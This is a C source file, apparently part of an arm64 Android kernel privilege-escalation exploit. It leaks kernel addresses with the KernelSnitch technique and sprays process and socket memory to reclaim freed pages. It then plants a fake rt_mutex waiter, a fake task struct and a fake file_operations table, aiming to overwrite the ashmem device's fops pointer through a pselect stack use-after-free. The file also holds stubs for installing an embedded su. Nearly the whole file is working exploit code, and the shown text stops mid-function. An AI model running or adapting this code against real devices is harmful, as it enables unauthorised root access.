#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

#ifndef SLIDE_FAKE_TASK_PI_LOCK_OFF
#define SLIDE_FAKE_TASK_PI_LOCK_OFF FAKE_TASK_PI_LOCK_OFF
#define SLIDE_FAKE_TASK_PI_WAITERS_OFF FAKE_TASK_PI_WAITERS_OFF
#define SLIDE_FAKE_TASK_PI_TOP_TASK_OFF FAKE_TASK_PI_TOP_TASK_OFF
#define SLIDE_FAKE_TASK_PI_BLOCKED_ON_OFF FAKE_TASK_PI_BLOCKED_ON_OFF
#endif

/*
 * userspace_to_direct_map: 将用户空间 mmap 地址转换为内核 direct map 地址。
 *
 * 问题: prepare_good_kernel_page 返回的 page_base 是 mmap 的用户空间地址。
 *   内核通过 TTBR1_EL1 访问内核地址空间，无法直接访问用户空间地址。
 *   rb_erase 读取 parent->rb_left 时访问的是用户空间地址 → page fault。
 *
 * 修复: 通过 /proc/self/pagemap 获取物理页帧号，计算 direct map 地址。
 *   direct_map = P0_PAGE_OFFSET + (pfn * PAGE_SIZE) + offset
 *   direct map 地址在内核页表中始终可访问。
 */
static uintptr_t userspace_to_direct_map(uintptr_t vaddr) {
    /* 如果地址已经在内核地址空间 (高位全1), 不需要转换 */
    if ((vaddr >> 48) == 0xffff) {
        pr_info("vaddr_to_direct: 0x%lx already kernel, skip\n", vaddr);
        return vaddr;
    }
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        pr_error("pagemap open failed: %s\n", strerror(errno));
        return 0;
    }
    uint64_t entry = 0;
    off_t offset = (off_t)(vaddr / PAGE_SIZE) * 8;
    if (lseek(fd, offset, SEEK_SET) < 0 || read(fd, &entry, 8) != 8) {
        close(fd);
        pr_error("pagemap read failed for 0x%lx\n", vaddr);
        return 0;
    }
    close(fd);

    if (!(entry & (1ULL << 63))) {
        pr_error("pagemap: page not present for 0x%lx\n", vaddr);
        return 0;
    }

    uint64_t pfn = entry & 0x7FFFFFFFFFFFFFULL;
    uintptr_t phys = (uintptr_t)(pfn * PAGE_SIZE);
    uintptr_t direct = P0_PAGE_OFFSET + phys + (vaddr & KS_PAGE_MASK);

    pr_info("vaddr_to_direct: vaddr=0x%lx pfn=0x%llx phys=0x%lx direct=0x%lx\n",
            vaddr, (unsigned long long)pfn, phys, direct);
    return direct;
}

#ifndef MAIN_FAKE_TASK_PI_LOCK_OFF
#define MAIN_FAKE_TASK_PI_LOCK_OFF FAKE_TASK_PI_LOCK_OFF
#define MAIN_FAKE_TASK_PI_WAITERS_OFF FAKE_TASK_PI_WAITERS_OFF
#define MAIN_FAKE_TASK_PI_TOP_TASK_OFF FAKE_TASK_PI_TOP_TASK_OFF
#define MAIN_FAKE_TASK_PI_BLOCKED_ON_OFF FAKE_TASK_PI_BLOCKED_ON_OFF
#endif

#ifndef VIOLIN_SLIDE_USE_FAKE_TASK
#define VIOLIN_SLIDE_USE_FAKE_TASK 0
#endif

#ifndef VIOLIN_SLIDE_FAKE_TASK_GROUP_ZERO
#define VIOLIN_SLIDE_FAKE_TASK_GROUP_ZERO 0
#endif

#ifndef VIOLIN_SLIDE_PI_TOP_TASK_FAKE
#define VIOLIN_SLIDE_PI_TOP_TASK_FAKE 0
#endif

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uintptr_t page_base;
uintptr_t leaked_mm_struct;  /* KernelSnitch 泄漏的 mm_struct 地址 */
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
static int pselect_custom_write;
static uintptr_t pselect_custom_target;
static uintptr_t pselect_custom_value;
static int pselect_custom_shape;
char ashmem_path[256] = "/dev/ashmem";

uintptr_t pselect_write_value(void) {
  return pselect_custom_write ? pselect_custom_value : fake_fops;
}

uintptr_t pselect_write_target(void) {
  return pselect_custom_write ? pselect_custom_target
                              : data_addr(ASHMEM_MISC) + 0x10;
}

int pselect_custom_write_enabled(void) {
  return pselect_custom_write;
}

int pselect_write_shape(void) {
  if (!pselect_custom_write) {
    return 0;
  }
  return pselect_custom_shape;
}

void set_pselect_write(uintptr_t target, uintptr_t value, int shape) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_shape = shape;
  pselect_custom_write = 1;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
  pselect_custom_shape = 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  int write_shape = pselect_write_shape();
  uintptr_t write_target = pselect_write_target();
  uintptr_t write_value = pselect_write_value();
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (write_shape == 1 && write_target >= 8) {
      fake_parent = write_target - 8;
      fake_right = write_value;
      fake_left = 0;
    } else {
      fake_parent = write_value;
      fake_right = 0;
      fake_left = write_target;
    }
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    /* miscdevice.fops is the pointer slot at ashmem_misc + 0x10.  The
     * rb_parent_color word used by the write primitive lives immediately
     * before that slot; misc_fops itself is a static file_operations object. */
    fake_parent = data_addr(ASHMEM_MISC) + 0x10 - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  /* FOPS 写入默认值:
   * write_pc = fake_fops (VALUE, 通过 rb_set_parent_color 写入目标)
   * write_left = (ashmem_misc + 0x10) - 0x08 (ADDRESS, 写入目标位置)
   * 写入机制: *(write_left + 0x08) = write_pc
   *         → ashmem_misc.fops = fake_fops.
   * Do not use the static misc_fops file_operations object as the target. */
  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = 0;
  uintptr_t write_left = data_addr(ASHMEM_MISC) + 0x10 - 0x08;
    uint64_t waiter_task = text_addr(INIT_TASK);
    uint64_t task_group = text_addr(ROOT_TASK_GROUP);
    uint64_t pi_top_task = text_addr(INIT_TASK);
    size_t pi_lock_off = MAIN_FAKE_TASK_PI_LOCK_OFF;
    size_t pi_waiters_off = MAIN_FAKE_TASK_PI_WAITERS_OFF;
    size_t pi_top_task_off = MAIN_FAKE_TASK_PI_TOP_TASK_OFF;
    size_t pi_blocked_on_off = MAIN_FAKE_TASK_PI_BLOCKED_ON_OFF;
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      write_pc = SLIDE_LOGGERS_0_1;
      write_right = 0;
      write_left = SLIDE_RANDOM_BOOT_ID_DATA;
      if (VIOLIN_SLIDE_USE_FAKE_TASK) {
        waiter_task = fake_task;
        task_group = VIOLIN_SLIDE_FAKE_TASK_GROUP_ZERO ? 0
                                                       : SLIDE_ROOT_TASK_GROUP;
        pi_top_task = VIOLIN_SLIDE_PI_TOP_TASK_FAKE ? fake_task
                                                    : SLIDE_INIT_TASK;
      } else {
        waiter_task = SLIDE_INIT_TASK;
        task_group = SLIDE_ROOT_TASK_GROUP;
        pi_top_task = SLIDE_INIT_TASK;
      }
      pi_lock_off = SLIDE_FAKE_TASK_PI_LOCK_OFF;
      pi_waiters_off = SLIDE_FAKE_TASK_PI_WAITERS_OFF;
      pi_top_task_off = SLIDE_FAKE_TASK_PI_TOP_TASK_OFF;
      pi_blocked_on_off = SLIDE_FAKE_TASK_PI_BLOCKED_ON_OFF;
    } else if (write_shape == 1 && write_target >= 8) {
      write_pc = write_target - 8;
      write_right = write_value;
      write_left = 0;
    }
    if (payload_mode == PAGE_PAYLOAD_FOPS && pselect_custom_write_enabled()) {
      waiter_task = fake_task;
      task_group = 0;
      pi_top_task = fake_task;
    }
    pr_info("payload mode=%d custom=%d shape=%d target=0x%llx value=0x%llx "
            "slide_fake_task=%d task=0x%llx task_group=0x%llx "
            "pi_top_task=0x%llx pi_lock=0x%zx pi_waiters=0x%zx pi_top=0x%zx "
            "pi_blocked=0x%zx\n",
            payload_mode, pselect_custom_write_enabled(), write_shape,
            (unsigned long long)write_target,
            (unsigned long long)write_value,
            payload_mode == PAGE_PAYLOAD_SLIDE && VIOLIN_SLIDE_USE_FAKE_TASK,
            (unsigned long long)waiter_task,
            (unsigned long long)task_group,
            (unsigned long long)pi_top_task,
            pi_lock_off, pi_waiters_off, pi_top_task_off, pi_blocked_on_off);

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, 0);
      put64(p, LOCK_OFF + 0x10, 0);
      put64(p, LOCK_OFF + 0x18, 0);
    } else {
      /* backup_v1 layout: lock waiters→fake_w0, owner→fake_task|1 (PI flag)
       * +0x00 wait_lock=0, +0x08 waiters.rb_node, +0x10 waiters.leftmost, +0x18 owner */
      put64(p, LOCK_OFF + 0x08, fake_w0);         /* waiters.rb_node = fake_w0 */
      put64(p, LOCK_OFF + 0x10, fake_w0);         /* waiters.rb_leftmost = fake_w0 */
      put64(p, LOCK_OFF + 0x18, fake_task | 1);   /* owner = fake_task|1 (PI flag) */
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    /* stack-UAF: fake_w0->lock = pselect_user_lock (用户态地址)
     * 与栈上 waiter->lock (stack-UAF 后指向 pselect_user_lock) 一致 */
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, (uint64_t)(uintptr_t)pselect_user_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + pi_lock_off, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      /* POC-pad7U: pi_waiters 指向 fake_w0 的 pi_tree 节点
       * 让 pi_waiters 树非空 → rb_insert 触发重平衡 → 写入 parent */
      put64(p, FAKE_TASK_OFF + pi_waiters_off,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    } else {
      put64(p, FAKE_TASK_OFF + pi_waiters_off,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + pi_top_task_off, pi_top_task);
    put64(p, FAKE_TASK_OFF + pi_waiters_off,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    put64(p, FAKE_TASK_OFF + pi_blocked_on_off, fake_w0);
    /* violin: 设置 sched_class 指向 fair_sched_class
     * UBSAN 类型哈希检查读取 sched_class->type_hash
     * 如果 sched_class = 0 (全零页面) → 哈希不匹配 → BRK #0x8228 → panic */
    put64(p, FAKE_TASK_OFF + 0x340, text_addr(FAIR_SCHED_CLASS));

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
  if (!ks) {
    pr_warning("KernelSnitch setup returned NULL\n");
    cleanup_page_prepare_state();
    return 0;
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = clone_leak_child();
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  memfd_leak = open_memfd(child_leak);
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    kill_child(spray_ctx.childs[i]);
  }
  SYSCHK(waitpid(child_leak, NULL, 0));

  if (!kernelsnitch_found_collisions(ks)) {
    pr_warning("KernelSnitch collision finding failed\n");
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks ? ks->mm_struct : (uintptr_t)-1;
  if (leaked == (uintptr_t)-1) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    if (ks) kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  /* 保存泄漏的 mm_struct 地址供阶段 2 使用 */
  leaked_mm_struct = leaked;
  pr_info("KernelSnitch leaked mm_struct=%016lx\n", (unsigned long)leaked_mm_struct);

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, payload_mode)) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core(CORE);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
